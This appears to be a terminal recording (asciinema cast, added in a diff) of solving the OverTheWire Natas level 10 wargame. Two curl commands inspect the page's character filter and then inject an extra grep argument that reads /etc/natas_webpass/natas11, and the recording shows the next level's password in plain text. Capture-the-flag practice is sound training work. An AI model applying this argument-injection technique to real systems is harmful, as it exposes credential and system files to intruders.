@@ -1,0 +1,6 @@
+{"version":3,"term":{"cols":100,"rows":32},"timestamp":1793469402,"idle_time_limit":2.0,"command":"python3 -I /home/claude/tools/ptyrun_sh.py /home/claude/solves/natas/L10.sh","title":"Natas L10 solve","env":{"SHELL":"/bin/bash"}}
+[0.008, "o", "$ curl -s -u natas10:<pw> http://natas10.natas.labs.overthewire.org/index-source.html    # blocks ; | & but grep is still shell-injectable\r\r\n"]
+[0.622, "o", "preg_match('/[;|&amp;]/',$key)\r\r\n"]
+[0.000, "o", "$ curl -s -u natas10:<pw> --data-urlencode \"needle=^ /etc/natas_webpass/natas11\" http://natas10.natas.labs.overthewire.org/\r\r\n"]
+[1.021, "o", "/etc/natas_webpass/natas11:VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd\r\r\n"]
+[18.156, "x", "0"]
